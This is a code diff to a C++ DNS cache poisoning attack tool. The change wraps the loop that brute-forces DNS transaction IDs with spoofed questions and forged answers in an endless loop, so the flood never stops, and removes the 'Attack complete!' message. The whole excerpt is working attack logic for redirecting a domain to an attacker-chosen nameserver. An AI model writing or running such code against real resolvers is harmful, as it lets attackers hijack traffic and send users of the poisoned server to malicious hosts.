@@ -38,19 +38,20 @@ int main(int argc, char* argv[]) {
 	strToIp(argv[5], ndest);
 	
 	srand(GetTickCount64());
-	cout << endl << "This attack will take anywhere from between 10 - 30 seconds, depending on how fast your internet connection is." << endl;
+	cout << endl << "In a seperate terminal, run NSLOOKUP every now and then to check when this attack is done." << endl;
 	
-	for (uint16_t tid = 0; tid <= 0xfffe; tid++) {
-		if (!send_question(handle, dns, convertDomain(argv[2]), (uint8_t*)(BYTE*)gateway)) {
-			cout << endl << "Failed to send packet. Are you sure you've chosen the correct interface?" << endl;
-			return 0;
-		}
-		if (!send_answer(handle, dns, convertDomain(argv[2]), convertDomain(argv[3]), ns, ndest, (uint8_t*)(BYTE*)gateway, tid)) {
-			cout << endl << "Failed to send packet. Are you sure you've chosen the correct interface?" << endl;
-			return 0;
+	while (1) {
+		for (uint16_t tid = 0; tid <= 0xfffe; tid++) {
+			if (!send_question(handle, dns, convertDomain(argv[2]), (uint8_t*)(BYTE*)gateway)) {
+				cout << endl << "Failed to send packet. Are you sure you've chosen the correct interface?" << endl;
+				return 0;
+			}
+			if (!send_answer(handle, dns, convertDomain(argv[2]), convertDomain(argv[3]), ns, ndest, (uint8_t*)(BYTE*)gateway, tid)) {
+				cout << endl << "Failed to send packet. Are you sure you've chosen the correct interface?" << endl;
+				return 0;
+			}
 		}
 	}
-
-	cout << endl << "Attack complete!" << endl;
+	
 	return 1;
 }
